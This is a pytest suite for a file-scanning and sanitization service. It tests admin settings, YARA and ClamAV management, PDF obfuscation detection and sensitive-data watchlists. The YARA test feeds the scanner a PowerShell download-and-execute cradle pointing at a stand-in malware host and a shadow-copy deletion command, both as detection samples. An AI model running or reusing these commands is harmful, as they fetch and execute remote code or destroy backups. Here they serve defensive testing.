import io
import pytest
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient

from app.main import app
from app.core.settings_store import settings_store, create_admin_token
from app.core.yara_manager import yara_manager
from app.analyzers.didier_pdf import DidierPDFAnalyzer, deobfuscate_pdf_name
from app.analyzers.virustotal_client import VirusTotalClient

client = TestClient(app)

def test_admin_login_and_auth_protection():
    # Invalid login
    res = client.post("/api/settings/login", json={"username": "wrong", "password": "bad"})
    assert res.status_code == 401

    # Valid login
    res = client.post("/api/settings/login", json={"username": "admin", "password": "admin"})
    assert res.status_code == 200
    token = res.json()["token"]
    assert token is not None

    # Access without auth
    res_no_auth = client.get("/api/settings")
    assert res_no_auth.status_code == 401

    # Access with auth
    headers = {"Authorization": f"Bearer {token}"}
    res_auth = client.get("/api/settings", headers=headers)
    assert res_auth.status_code == 200
    data = res_auth.json()["settings"]
    assert "global_checks" in data
    assert "format_checks" in data
    assert "api_keys" in data

def test_update_settings_and_persistence():
    token = create_admin_token("admin")
    headers = {"Authorization": f"Bearer {token}"}

    original_vt_key = settings_store.get_api_key("virustotal_api_key")

    update_payload = {
        "global_checks": {
            "clamav_enabled": False,
            "yara_enabled": True
        },
        "api_keys": {
            "virustotal_api_key": "test_fake_api_key_12345678"
        }
    }
    try:
        res = client.put("/api/settings", json=update_payload, headers=headers)
        assert res.status_code == 200
        sett = res.json()["settings"]
        assert sett["global_checks"]["clamav_enabled"] is False
        # Key should be masked in response
        assert "..." in sett["api_keys"]["virustotal_api_key"] or "********" in sett["api_keys"]["virustotal_api_key"]

        # Verify actual key is saved in store
        assert settings_store.get_api_key("virustotal_api_key") == "test_fake_api_key_12345678"
    finally:
        # Reset clamav_enabled to True and restore original virustotal_api_key
        client.put("/api/settings", json={
            "global_checks": {"clamav_enabled": True},
            "api_keys": {"virustotal_api_key": original_vt_key}
        }, headers=headers)


def test_yara_rule_crud_and_compilation():
    token = create_admin_token("admin")
    headers = {"Authorization": f"Bearer {token}"}

    # 1. List rules
    res = client.get("/api/settings/yara/rules", headers=headers)
    assert res.status_code == 200
    rules = res.json()["rules"]
    assert len(rules) >= 4

    # 2. Add invalid rule (syntax error)
    bad_rule = {
        "name": "Bad Syntax Rule",
        "severity": "HIGH",
        "target_format": "PDF",
        "rule_text": "rule Broken { syntax error here }"
    }
    res_bad = client.post("/api/settings/yara/rules", json=bad_rule, headers=headers)
    assert res_bad.status_code == 400
    assert "YARA Syntax Error" in res_bad.json()["detail"]

    # 3. Add valid rule
    valid_rule = {
        "name": "Custom Test Indicator",
        "description": "Searches for test canary string",
        "severity": "CRITICAL",
        "target_format": "TEXT",
        "rule_text": 'rule Canary_Indicator { strings: $c = "CANARY_TEST_MALWARE" condition: $c }'
    }
    res_good = client.post("/api/settings/yara/rules", json=valid_rule, headers=headers)
    assert res_good.status_code == 200
    created_id = res_good.json()["rule"]["id"]

    # 4. Toggle rule
    res_toggle = client.put(f"/api/settings/yara/rules/{created_id}/toggle", json={"enabled": False}, headers=headers)
    assert res_toggle.status_code == 200
    assert res_toggle.json()["rule"]["enabled"] is False

    # 5. Delete rule
    res_del = client.delete(f"/api/settings/yara/rules/{created_id}", headers=headers)
    assert res_del.status_code == 200

def test_didier_stevens_deobfuscation_and_pdfid(tmp_path):
    # Test hex deobfuscation helper
    assert deobfuscate_pdf_name("/#4a#61vaScript") == "/JavaScript"
    assert deobfuscate_pdf_name("/J#61vaScript") == "/JavaScript"
    assert deobfuscate_pdf_name("/L#61unch") == "/Launch"

    # Create dummy PDF with hex obfuscated tags
    pdf_content = (
        b"%PDF-1.4\n"
        b"1 0 obj\n"
        b"<< /Type /Catalog /Pages 2 0 R /#4a#61vaScript 3 0 R /#4c#61unch 4 0 R >>\n"
        b"endobj\n"
        b"2 0 obj\n"
        b"<< /Type /Pages /Count 1 /Kids [5 0 R] >>\n"
        b"endobj\n"
        b"5 0 obj\n"
        b"<< /Type /Page /Parent 2 0 R >>\n"
        b"endobj\n"
        b"trailer\n"
        b"<< /Root 1 0 R >>\n"
        b"%%EOF\n"
    )
    p = tmp_path / "obfuscated.pdf"
    p.write_bytes(pdf_content)

    res = DidierPDFAnalyzer.scan_file(p)
    assert res["has_hex_obfuscation"] is True
    assert res["obfuscated_tags"]["/JavaScript"] > 0
    assert res["obfuscated_tags"]["/Launch"] > 0

def test_virustotal_client_links_and_fallback():
    # Without api key or with fallback
    link = VirusTotalClient.get_hash_web_link("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
    assert "https://www.virustotal.com/gui/file/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" == link

    url_link = VirusTotalClient.get_url_web_link("http://malware-test.com/payload.exe")
    assert "https://www.virustotal.com/gui/search/http%3A%2F%2Fmalware-test.com%2Fpayload.exe" == url_link

def test_clamav_manager_status():
    token = create_admin_token("admin")
    headers = {"Authorization": f"Bearer {token}"}

    res = client.get("/api/settings/clamav", headers=headers)
    assert res.status_code == 200
    info = res.json()["clamav"]
    assert "status" in info
    assert "host" in info
    assert "definitions" in info

def test_external_policy_and_statistics():
    token = create_admin_token("admin")
    headers = {"Authorization": f"Bearer {token}"}

    # 1. Fetch current external policy
    res = client.get("/api/settings/external-policy", headers=headers)
    assert res.status_code == 200
    policy = res.json()["policy"]
    assert "allow_all_external" in policy
    assert "allow_screenshots" in policy
    assert "allow_tls_inspection" in policy

    # 2. Update external policy
    res_up = client.put(
        "/api/settings/external-policy",
        json={"allow_screenshots": False, "allow_tls_inspection": False},
        headers=headers
    )
    assert res_up.status_code == 200
    updated = res_up.json()["policy"]
    assert updated["allow_screenshots"] is False
    assert updated["allow_tls_inspection"] is False

    # Check settings_store directly
    assert settings_store.is_external_allowed("allow_screenshots") is False
    assert settings_store.is_external_allowed("allow_tls_inspection") is False

    # Re-enable
    client.put(
        "/api/settings/external-policy",
        json={"allow_screenshots": True, "allow_tls_inspection": True},
        headers=headers
    )
    assert settings_store.is_external_allowed("allow_screenshots") is True

    # 3. Fetch statistics
    res_stats = client.get("/api/settings/statistics", headers=headers)
    assert res_stats.status_code == 200
    stats = res_stats.json()["statistics"]
    assert "total_files_analyzed" in stats
    assert "total_files_sanitized" in stats
    assert "categories_count" in stats
    assert "sanitization_formats" in stats

def test_warninglist_crud_and_edit():
    token = create_admin_token("admin")
    headers = {"Authorization": f"Bearer {token}"}

    # Add rule
    new_rule = {
        "pattern": "sensitive_keyword_test",
        "is_regex": False,
        "severity": "high",
        "description": "Test rule description"
    }
    res_add = client.post("/api/settings/warninglist", json=new_rule, headers=headers)
    assert res_add.status_code == 200
    rule_id = res_add.json()["rule"]["id"]
    assert rule_id is not None

    # Edit rule
    edit_rule = {
        "pattern": "updated_keyword_test",
        "is_regex": True,
        "severity": "critical",
        "description": "Updated rule description"
    }
    res_edit = client.put(f"/api/settings/warninglist/{rule_id}", json=edit_rule, headers=headers)
    assert res_edit.status_code == 200
    edited = res_edit.json()["rule"]
    assert edited["pattern"] == "updated_keyword_test"
    assert edited["is_regex"] is True
    assert edited["severity"] == "critical"

    # Delete rule
    res_del = client.delete(f"/api/settings/warninglist/{rule_id}", headers=headers)
    assert res_del.status_code == 200

def test_yara_validation_and_edit():
    token = create_admin_token("admin")
    headers = {"Authorization": f"Bearer {token}"}

    # Validate valid syntax
    valid_syntax = 'rule ValidSyntax { strings: $a = "test" condition: $a }'
    res_val1 = client.post("/api/settings/yara/validate", json={"rule_text": valid_syntax}, headers=headers)
    assert res_val1.status_code == 200
    assert res_val1.json()["valid"] is True
    assert res_val1.json()["error"] is None

    # Validate invalid syntax
    invalid_syntax = 'rule InvalidSyntax { strings: $a = condition: }'
    res_val2 = client.post("/api/settings/yara/validate", json={"rule_text": invalid_syntax}, headers=headers)
    assert res_val2.status_code == 200
    assert res_val2.json()["valid"] is False
    assert res_val2.json()["error"] is not None

    # Create then update a YARA rule
    create_req = {
        "name": "Temporary Test YARA Rule",
        "description": "Initial text",
        "severity": "MEDIUM",
        "target_format": "PDF",
        "rule_text": 'rule Initial_Rule { strings: $x = "INITIAL_CANARY" condition: $x }'
    }
    res_cr = client.post("/api/settings/yara/rules", json=create_req, headers=headers)
    assert res_cr.status_code == 200
    rule_id = res_cr.json()["rule"]["id"]

    update_req = {
        "name": "Updated Test YARA Rule",
        "description": "Edited text",
        "severity": "HIGH",
        "target_format": "ALL",
        "rule_text": 'rule Edited_Rule { strings: $x = "EDITED_CANARY" condition: $x }'
    }
    res_up = client.put(f"/api/settings/yara/rules/{rule_id}", json=update_req, headers=headers)
    assert res_up.status_code == 200
    assert res_up.json()["rule"]["name"] == "Updated Test YARA Rule"
    assert res_up.json()["rule"]["severity"] == "HIGH"

    # Cleanup
    client.delete(f"/api/settings/yara/rules/{rule_id}", headers=headers)

def test_url_shortener_detection():
    from app.analyzers.url_analyzer import URLAnalyzer
    res = URLAnalyzer.analyze_url("https://shorturl.at/CT7su")
    assert res["is_shortener"] is True
    assert any("shortening service" in ind.lower() for ind in res["indicators"])

def test_job_status_and_analysis_step_tracking():
    # Upload sample file
    files = {"files": ("step_test.txt", io.BytesIO(b"Hello secure world"), "text/plain")}
    res = client.post("/api/files", files=files)
    assert res.status_code == 200
    job_id = res.json()["jobs"][0]["job_id"]

    # Test status endpoint returns current_step and progress
    res_status = client.get(f"/api/jobs/{job_id}")
    assert res_status.status_code == 200
    status_data = res_status.json()
    assert "current_step" in status_data
    assert "current_step_label" in status_data
    assert isinstance(status_data["progress"], int)
    assert isinstance(status_data["current_step"], int)

    # Test analysis endpoint returns current_step and progress
    res_analysis = client.get(f"/api/jobs/{job_id}/analysis")
    assert res_analysis.status_code == 200
    analysis_data = res_analysis.json()
    assert "current_step" in analysis_data
    assert "current_step_label" in analysis_data
    assert "progress" in analysis_data
    assert isinstance(analysis_data["progress"], int)
    assert analysis_data["progress"] == 100
    assert analysis_data["current_step"] == 8

def test_expanded_builtin_yara_rules():
    rules = yara_manager.list_rules()
    rule_ids = {r["id"] for r in rules}
    assert "builtin_powershell_cradle_download" in rule_ids
    assert "builtin_office_autoexec_evasion" in rule_ids
    assert "builtin_pdf_embedded_shellcode" in rule_ids
    assert "builtin_webshell_obfuscated_eval" in rule_ids
    assert "builtin_ransomware_shadow_copy_purge" in rule_ids
    assert "builtin_suspicious_archive_traversal" in rule_ids

    # Test detection of PowerShell cradle
    ps_cradle_code = b'$client = New-Object Net.WebClient; IEX($client.DownloadString("http://malware.com/payload.ps1"))'
    matches = yara_manager.scan_bytes(ps_cradle_code, "binary")
    matched_ids = {m["rule_id"] for m in matches}
    assert "builtin_powershell_cradle_download" in matched_ids

    # Test detection of ransomware shadow copy purge
    ransom_code = b'echo deleting backups && vssadmin delete shadows /all /quiet'
    matches_ransom = yara_manager.scan_bytes(ransom_code, "binary")
    matched_ransom_ids = {m["rule_id"] for m in matches_ransom}
    assert "builtin_ransomware_shadow_copy_purge" in matched_ransom_ids

def test_expanded_watchlist_patterns():
    from app.analyzers.watchlist_analyzer import WatchlistAnalyzer

    # Swedish Personnummer test
    pnr_text = "The customer identity is 19850612-4321 for verification."
    matches = WatchlistAnalyzer.scan_text(pnr_text)
    assert any("Swedish Personal Identity" in m.title or "Personnummer" in m.title or "wl-se-pnr" in str(m.details) for m in matches)

    # Credit card test
    cc_text = "Card number on file: 4111 2222 3333 4444 expiration 12/28"
    matches_cc = WatchlistAnalyzer.scan_text(cc_text)
    assert any("Credit card" in m.title or "wl-credit-card" in str(m.details) for m in matches_cc)

    # Email test
    email_text = "Contact security officer at security-lead@internal-bank.se for details"
    matches_email = WatchlistAnalyzer.scan_text(email_text)
    assert any("Email address" in m.title or "wl-email-addr" in str(m.details) for m in matches_email)

    # JWT token test
    jwt_text = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.doNotLeakThis"
    matches_jwt = WatchlistAnalyzer.scan_text(jwt_text)
    assert any("JWT" in m.title or "wl-jwt-token" in str(m.details) for m in matches_jwt)

def test_statistics_30_day_timeline_and_bytes():
    token = create_admin_token("admin")
    headers = {"Authorization": f"Bearer {token}"}
    res = client.get("/api/settings/statistics", headers=headers)
    assert res.status_code == 200
    stats = res.json()["statistics"]
    assert "last_30_days" in stats
    assert len(stats["last_30_days"]) == 30
    assert "date" in stats["last_30_days"][0]
    assert "day" in stats["last_30_days"][0]
    assert "count" in stats["last_30_days"][0]
    assert "total_bytes_processed" in stats
    assert "severity_distribution" in stats

def test_clamav_days_old_and_update_check():
    from app.core.clamav_manager import clamav_manager
    token = create_admin_token("admin")
    headers = {"Authorization": f"Bearer {token}"}

    # Test GET /api/settings/clamav returns days old attributes
    res = client.get("/api/settings/clamav", headers=headers)
    assert res.status_code == 200
    clamav = res.json()["clamav"]
    assert "db_days_old" in clamav
    assert "db_days_old_text" in clamav
    if clamav["definitions"]:
        def0 = clamav["definitions"][0]
        assert "days_old" in def0
        assert "days_old_text" in def0

    # Test GET /api/settings/clamav/check-updates with simulate_newer=True
    res_update = client.get("/api/settings/clamav/check-updates?simulate_newer=true", headers=headers)
    assert res_update.status_code == 200
    data = res_update.json()
    assert data["success"] is True
    assert data["update_check"]["newer_available"] is True
    assert "Newer definition files exist" in data["update_check"]["message"]



